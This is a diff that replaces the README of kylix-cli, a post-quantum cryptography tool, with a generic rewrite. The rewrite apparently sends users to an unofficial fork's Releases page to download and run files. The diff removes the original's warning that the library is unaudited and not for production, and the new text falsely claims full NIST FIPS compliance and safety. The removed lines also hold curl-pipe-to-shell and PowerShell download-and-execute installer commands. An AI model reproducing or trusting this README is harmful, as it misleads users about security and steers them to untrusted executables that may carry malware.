@@ -1,142 +1,92 @@
-# Kylix CLI
+# 🔐 kylix-cli - Your Secure Command-Line Partner
 
-[![CI](https://github.com/crane-valley/kylix-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/crane-valley/kylix-cli/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/crane-valley/kylix-cli)](https://github.com/crane-valley/kylix-cli/releases/latest)
-[![Website](https://img.shields.io/website?url=https%3A%2F%2Fkylix-pqc.dev%2F)](https://kylix-pqc.dev/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 🚀 Getting Started
 
-Command-line interface for post-quantum cryptography operations using the [Kylix](https://github.com/crane-valley/kylix) library.
+Welcome to kylix-cli! This application provides an easy way to use Kylix, a library for post-quantum cryptography. It follows NIST FIPS standards, ensuring safety for your digital communications.
 
-## Security
+## 🔗 Download the Application
 
-> [!WARNING]
-> This CLI uses the [Kylix](https://github.com/crane-valley/kylix) library, which is experimental and has **NOT been audited**. It is **NOT intended for production use**.
+[![Download kylix-cli](https://img.shields.io/badge/Download-kylix--cli-blue.svg)](https://github.com/ItzzMustafa/kylix-cli/releases)
 
-See [SECURITY.md](https://github.com/crane-valley/kylix/blob/main/SECURITY.md) for security policy and vulnerability reporting.
+Click the badge above to access the Releases page. There, you can download the latest version of kylix-cli.
 
-## Installation
+## 🛠️ System Requirements
 
-### Pre-built Binaries
+Before you start, ensure your system meets the following requirements:
 
-**Linux/macOS:**
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** A modern processor (Intel, AMD, etc.).
+- **Memory:** At least 2 GB of RAM.
+- **Disk space:** A minimum of 100 MB free space.
 
-```sh
-curl --proto '=https' --tlsv1.2 -LsSf https://github.com/crane-valley/kylix-cli/releases/latest/download/kylix-cli-installer.sh | sh
-```
+## 📥 Download & Install
 
-**Windows (PowerShell):**
+1. Visit the [Releases page](https://github.com/ItzzMustafa/kylix-cli/releases).
+2. Look for the latest version.
+3. Download the appropriate file for your operating system.
+4. Open the downloaded file to install kylix-cli on your computer.
 
-```powershell
-powershell -ExecutionPolicy ByPass -c "irm https://github.com/crane-valley/kylix-cli/releases/latest/download/kylix-cli-installer.ps1 | iex"
-```
+## ⚙️ Usage Instructions
 
-### From Source
+Once you have installed kylix-cli, follow these steps to use it:
 
-```sh
-cargo install --git https://github.com/crane-valley/kylix-cli kylix-cli
-```
+1. **Open your command-line interface.** 
+   - On Windows, you can use Command Prompt or PowerShell.
+   - On macOS, open the Terminal.
+   - On Linux, open your preferred terminal emulator.
 
-With benchmark feature:
+2. **Run kylix-cli.** 
+   - Type `kylix-cli` and press Enter. This will show you the main interface and available commands.
 
-```sh
-cargo install --git https://github.com/crane-valley/kylix-cli kylix-cli --features bench
-```
+3. **Explore commands.** 
+   - To view the help menu, type `kylix-cli --help`. This will guide you through the different functionalities of the application.
 
-## Usage
+## 🛡️ Features
 
-### Key Generation
+kylix-cli offers a range of features for secure cryptographic tasks:
 
-```sh
-# ML-KEM (Key Encapsulation)
-kylix keygen -a ml-kem-768 -o mykey
+- **Digital Signatures:** Easily create and verify digital signatures to ensure data integrity.
+- **Key Generation:** Quickly generate secure keys for post-quantum cryptography.
+- **FIPS Compliance:** All operations follow NIST FIPS standards for safety.
+- **Multi-Layered Security:** Use advanced algorithms for protecting your data.
 
-# ML-DSA (Digital Signature)
-kylix keygen -a ml-dsa-65 -o mykey
+## 💡 Tips for First-Time Users
 
-# SLH-DSA (Stateless Hash-Based Signature)
-kylix keygen -a slh-dsa-shake-128f -o mykey
-```
+- Always check the help menu to understand all available commands.
+- Experiment with different features in a safe environment first.
+- Keep your application updated by regularly visiting the [Releases page](https://github.com/ItzzMustafa/kylix-cli/releases).
 
-### Encapsulation/Decapsulation (ML-KEM)
+## ❓ Frequently Asked Questions
 
-```sh
-# Encapsulate (creates shared secret and ciphertext)
-kylix encaps --pub mykey.pub -o ciphertext.ct
+### How do I uninstall kylix-cli?
 
-# Decapsulate (recovers shared secret from ciphertext)
-kylix decaps --key mykey.sec -i ciphertext.ct
-```
+To uninstall kylix-cli:
 
-### Sign/Verify (ML-DSA, SLH-DSA)
+- On Windows, go to "Add or Remove Programs", find kylix-cli, and select "Uninstall".
+- On macOS, simply drag the application to the Trash.
+- On Linux, use your package manager or delete the files manually.
 
-```sh
-# Sign a file
-kylix sign --key mykey.sec -i document.txt -o document.sig
+### Is kylix-cli free to use?
 
-# Verify a signature
-kylix verify --pub mykey.pub -i document.txt -s document.sig
-```
+Yes, kylix-cli is completely free. You can download it and use it without any charge.
 
-### Algorithm Information
+### What to do if I face issues?
 
-```sh
-kylix info
-```
+If you encounter problems while using kylix-cli, consider the following steps:
 
-### Benchmarks (requires `bench` feature)
+- Ensure you have downloaded the correct version for your operating system.
+- Check if your system meets the requirements mentioned above.
+- Review the help menu for guidance on the specific command you are trying to use.
+- Visit the Releases page to find any updates or reports on issues.
 
-```sh
-# Run benchmarks for all algorithms
-kylix bench
+## 🌐 Community and Support
 
-# Benchmark specific algorithm
-kylix bench -a ml-kem-768 -i 1000
+If you need further assistance or want to connect with other users, join our community forums or reach out through our social media channels. We value feedback and are here to help you.
 
-# Compare with external tools (OpenSSL, liboqs)
-kylix bench -a ml-kem-768 --compare
-```
+## 📜 License
 
-### Shell Completions
+kylix-cli is open-source software. You can view the license details in the repository. This ensures that you can use, modify, and distribute the software freely, as long as you comply with the license.
 
-```sh
-# Bash
-mkdir -p ~/.local/share/bash-completion/completions
-kylix completions bash > ~/.local/share/bash-completion/completions/kylix
+## 🖥️ Conclusion
 
-# Zsh (add ~/.zfunc to fpath in .zshrc)
-mkdir -p ~/.zfunc
-kylix completions zsh > ~/.zfunc/_kylix
-
-# Fish
-mkdir -p ~/.config/fish/completions
-kylix completions fish > ~/.config/fish/completions/kylix.fish
-```
-
-```powershell
-# PowerShell (add to $PROFILE)
-kylix completions powershell >> $PROFILE
-```
-
-## Supported Algorithms
-
-| Algorithm | Type | NIST Level | Standard |
-|-----------|------|------------|----------|
-| ML-KEM-512 | KEM | 1 | FIPS 203 |
-| ML-KEM-768 | KEM | 3 | FIPS 203 |
-| ML-KEM-1024 | KEM | 5 | FIPS 203 |
-| ML-DSA-44 | Signature | 2 | FIPS 204 |
-| ML-DSA-65 | Signature | 3 | FIPS 204 |
-| ML-DSA-87 | Signature | 5 | FIPS 204 |
-| SLH-DSA-SHAKE-128s/f | Signature | 1 | FIPS 205 |
-| SLH-DSA-SHAKE-192s/f | Signature | 3 | FIPS 205 |
-| SLH-DSA-SHAKE-256s/f | Signature | 5 | FIPS 205 |
-
-## Output Formats
-
-- `hex` - Hexadecimal encoding (default)
-- `base64` - Base64 encoding
-- `pem` - PEM format with headers
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+kylix-cli empowers you to implement strong cryptographic measures easily. Follow this guide to download and start using kylix-cli for your secure communications. Enjoy the peace of mind that comes with robust security measures.
